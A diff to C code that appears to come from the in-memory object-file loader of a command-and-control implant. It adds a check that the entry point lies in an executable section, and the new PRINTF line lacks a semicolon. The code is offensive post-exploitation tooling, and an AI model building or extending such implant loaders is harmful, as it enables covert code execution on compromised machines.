@@ -181,6 +181,7 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
         }
     }
 
+    // did we find it?
     if ( ! CoffeeMain )
     {
         PRINTF( "[!] Couldn't find function => %s\n", Function );
@@ -192,6 +193,26 @@ BOOL CoffeeExecuteFunction( PCOFFEE Coffee, PCHAR Function, PVOID Argument, SIZE
         PackageAddBytes( Package, Function, StringLengthA( Function ) );
         PackageTransmit( Package, NULL, NULL );
 
+        return FALSE;
+    }
+
+    // make sure the entry point is on executable memory
+    Success = FALSE;
+    for ( UINT16 SectionCnt = 0; SectionCnt < Coffee->Header->NumberOfSections; SectionCnt++ )
+    {
+        if ( CoffeeMain >= Coffee->SecMap[ SectionCnt ].Ptr && CoffeeMain < Coffee->SecMap[ SectionCnt ].Ptr + Coffee->SecMap[ SectionCnt ].Size )
+        {
+            Coffee->Section = U_PTR( Coffee->Data ) + sizeof( COFF_FILE_HEADER ) + U_PTR( sizeof( COFF_SECTION ) * SectionCnt );
+            if ( Coffee->Section->Characteristics & STYP_TEXT )
+                Success = TRUE;
+
+            break;
+        }
+    }
+
+    if ( ! Success )
+    {
+        PRINTF( "The entry point (%p) is not on executable memory\n", CoffeeMain )
         return FALSE;
     }
 
